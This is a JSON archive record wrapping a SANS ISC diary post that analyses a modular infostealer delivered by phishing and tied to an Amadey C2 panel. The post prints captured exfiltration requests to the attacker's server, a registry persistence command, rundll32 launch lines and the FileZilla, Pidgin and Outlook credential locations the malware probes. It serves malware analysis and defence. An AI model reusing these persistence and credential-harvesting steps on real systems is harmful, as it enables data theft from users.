@@ -1,0 +1,42 @@
+{
+    "id": "66466cab-3505-4bc7-820d-be2395cf41f3",
+    "created_at": "2023-01-12T15:00:48.465654Z",
+    "updated_at": "2025-03-27T02:05:23.625896Z",
+    "deleted_at": null,
+    "sha1_hash": "703efcfea667ef34fabfd79da84878627f5a5c73",
+    "title": "2021-03-31 - Quick Analysis of a Modular InfoStealer",
+    "authors": "",
+    "file_creation_date": "2022-05-28T15:57:58Z",
+    "file_modification_date": "2022-05-28T15:57:58Z",
+    "file_size": 1746026,
+    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/27264**\n\n## Quick Analysis of a Modular InfoStealer\n\n**Published: 2021-03-31**\n\n**Last Updated: 2021-03-31 08:34:54 UTC**\n\n**by** [Xavier Mertens (Version: 1)](https://isc.sans.edu/handler_list.html#xavier-mertens)\n\n[0 comment(s)](https://isc.sans.edu/forums/diary/Quick+Analysis+of+a+Modular+InfoStealer/27264/#comments)\nThis morning, an interesting phishing email landed in my spam trap. The mail was redacted in Spanish and, as usual,\nasked the recipient to urgently process the attached document. The filename was \"AVISO.001\" (This extension is used\nby multi-volume archives). The archive contained a PE file with a very long\nname: AVISO11504122921827776385010767000154304736120425314155656824545860211706529881523930427.exe\n(SHA256:ff834f404b977a475ef56f1fa81cf91f0ac7e07b8d44e0c224861a3287f47c8c). The file is unknown on VT at this\ntime so I did a quick analysis.\n\nIt first performs a quick review of the target and exfiltrates the collected information:\n```\nPOST /7Ndd3SnW/index.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: 176[.]111[.]174[.]67\nContent-Length: 83\nCache-Control: no-cache\nid=152140224449&vs=2.11&sd=c5c741&os=9&bi=1&ar=1&pc=WIN7X64&un=user01&dm=&av=0&lv=0\n\n```\nYou can see the name of the computer (\"pc=\"), the user (\"un=\"). No AV is running (av=0). There is an ID (randomly\ngenerated) and a version of the malware or campaign? (\"vs=\").\n\nThe next step is to drop itself into `C:\\ProgramData\\011ab573a3\\rween.exe . This malware is modular and`\ndownloads two DLLs located on the C2 server:\n\n\n-----\n\n[Those DLLs are known on VT [1][2]:](https://www.virustotal.com/gui/file/6f917b86c623a4ef2326de062cb206208b25d93f6d7a2911bc7c10f7c83ffd64/detection)\n```\nremnux@remnux:/MalwareZoo/20210331$ shasum -a 256 *.dll\n6f917b86c623a4ef2326de062cb206208b25d93f6d7a2911bc7c10f7c83ffd64 cred.dll\n3d0efa67d54ee1452aa53f35db5552fe079adfd14f1fe312097b266943dd9644 scr.dll\n\n```\nPersistence is achieved via a new registry key. Any shortcut created to the location pointed by a subkey `Startup will`\nlaunch the service during logon/reboot.\n```\n\"C:\\Windows\\System32\\cmd.exe\" /C REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell\nFolders\" /f /v Startup /t REG_SZ /d C:\\ProgramData\\011ab573a3\\\n\n```\nDLLs are not loaded into the main program with LoadLibrary() but there are launched from rundll32:\n```\n\"C:\\Windows\\System32\\rundll32.exe\" C:\\ProgramData\\5eba991cccd123\\cred.dll, Main\n\"C:\\Windows\\System32\\rundll32.exe\" C:\\ProgramData\\5eba991cccd123\\scr.dll, Main\n\n```\nOnce the DLLs are launched, the exfiltration of data starts:\n\ncred.dll is responsible for searching credentials. Example of probes detected:\n\nOutlook ( HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging\n```\n   Subsystem\\Profiles\\Outlook )\n\n```\nFileZilla ( C:\\Users\\user01\\AppData\\Roaming\\FileZilla\\sitemanager.xml )\nPurple ( C:\\Users\\user01\\AppData\\Roaming\\.purple\\accounts.xml )\n\nData is then exfiltrated:\n```\nPOST //7Ndd3SnW/index.php HTTP/1.1\nHost: 176.111.174.67\nContent-Length: 21\nContent-Type: application/x-www-form-urlencoded\nid=152140224449&cred=\n\n```\n(In my sandbox, my credentials was available)\n\nscr.dll is used to take screenshots at regular interval and also exfiltrate them:\n\n\n-----\n\n```\n             p p p\nHost: 176.111.174.67\nUser-Agent: Uploador\nContent-Type: multipart/form-data; boundary=152140224449.jpg\nConnection: Keep-Alive\nContent-Length: 34758\n--152140224449.jpg\nContent-Disposition: form-data; name=\"data\"; filename=\"152140224449.jpg\"\nContent-Type: application/octet-stream\n......JFIF.............C.......... (data removed)\n\n```\n[Note the nice User-Agent: \"Uploador\". I found references to this string back in 2015![3].](https://github.com/techbliss/Yara_Mailware_Quick_menu_scanner/blob/master/yara/malware/Derkziel_Stealer.yar)\n\nHere is a screenshot of the C2 panel, a good old Amadey:\n\n\n-----\n\nEven if the malware looks old-fashioned, it remains effective and already made some victims. I found a lot of\nscreenshots (461) on the C2 server:\n\n\n-----\n\n[1] https://www.virustotal.com/gui/file/6f917b86c623a4ef2326de062cb206208b25d93f6d7a2911bc7c10f7c83ffd64/dete\nction\n\n[2] https://www.virustotal.com/gui/file/3d0efa67d54ee1452aa53f35db5552fe079adfd14f1fe312097b266943dd9644/det\nection\n\n[3] [https://github.com/techbliss/Yara_Mailware_Quick_menu_scanner/blob/master/yara/malware/Derkziel_Stealer.yar](https://github.com/techbliss/Yara_Mailware_Quick_menu_scanner/blob/master/yara/malware/Derkziel_Stealer.yar)\n\n[4] [https://blogs.blackberry.com/en/2020/01/threat-spotlight-amadey-bot](https://blogs.blackberry.com/en/2020/01/threat-spotlight-amadey-bot)\n\nXavier Mertens (@xme)\n\nSenior ISC Handler - Freelance Cyber Security Consultant\n\n[PGP Key](https://keybase.io/xme/key.asc)\n\n[Keywords: DLL](https://isc.sans.edu/tag.html?tag=DLL) [Exfiltration](https://isc.sans.edu/tag.html?tag=Exfiltration) [InfoStealer](https://isc.sans.edu/tag.html?tag=InfoStealer) [Malware](https://isc.sans.edu/tag.html?tag=Malware) [Modular](https://isc.sans.edu/tag.html?tag=Modular)\n[0 comment(s)](https://isc.sans.edu/forums/diary/Quick+Analysis+of+a+Modular+InfoStealer/27264/)\n\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and Techniques with Xavier Mertens in\nAmsterdam starting Aug 15 2022\n\nTop of page\n×\n\n[Diary Archives](https://isc.sans.edu/diaryarchive.html)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-31 - Quick Analysis of a Modular InfoStealer.pdf"
+    ],
+    "report_names": [
+        "2021-03-31 - Quick Analysis of a Modular InfoStealer.pdf"
+    ],
+    "threat_actors": [],
+    "ts_created_at": 1673535648,
+    "ts_updated_at": 1743041123,
+    "ts_creation_date": 1653753478,
+    "ts_modification_date": 1653753478,
+    "files": {
+        "pdf": "https://archive.orkl.eu/703efcfea667ef34fabfd79da84878627f5a5c73.pdf",
+        "text": "https://archive.orkl.eu/703efcfea667ef34fabfd79da84878627f5a5c73.txt",
+        "img": "https://archive.orkl.eu/703efcfea667ef34fabfd79da84878627f5a5c73.jpg"
+    }
+}
